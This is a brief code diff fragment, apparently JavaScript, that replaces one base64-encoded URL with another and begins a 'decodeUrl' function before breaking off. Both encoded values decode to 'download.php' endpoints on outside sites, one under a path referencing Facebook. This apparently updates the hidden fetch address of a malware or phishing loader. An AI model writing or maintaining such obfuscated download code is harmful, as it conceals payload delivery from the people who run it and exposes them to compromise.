-var encodedUrl = 'aHR0cHM6Ly9vZGFrbWFnYXphLmNvbS9BVC9kb3dubG9hZC5waHA=';
+var encodedUrl = 'aHR0cHM6Ly9zdWJ0bGUtc3R5bGUuY29tL1RpY19BVF9GYWNlYm9va19PTERfMV9lcV8xL2Rvd25sb2FkLnBocA==';
 
 function decodeUrl(b64) {
     try {
